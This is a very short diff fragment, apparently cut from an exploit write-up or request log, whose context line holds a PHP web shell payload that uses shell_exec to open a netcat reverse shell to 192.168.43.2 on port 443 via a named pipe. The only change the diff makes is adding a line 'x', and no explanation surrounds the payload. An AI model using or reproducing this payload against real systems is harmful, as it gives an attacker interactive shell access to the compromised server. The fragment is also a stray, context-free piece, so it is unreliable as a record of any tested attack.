@@ -17,3 +17,4 @@ Content-Length: 11<br/>
 
 <?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.2 443 >/tmp/f"); ?><br/>
 ====================================
+x
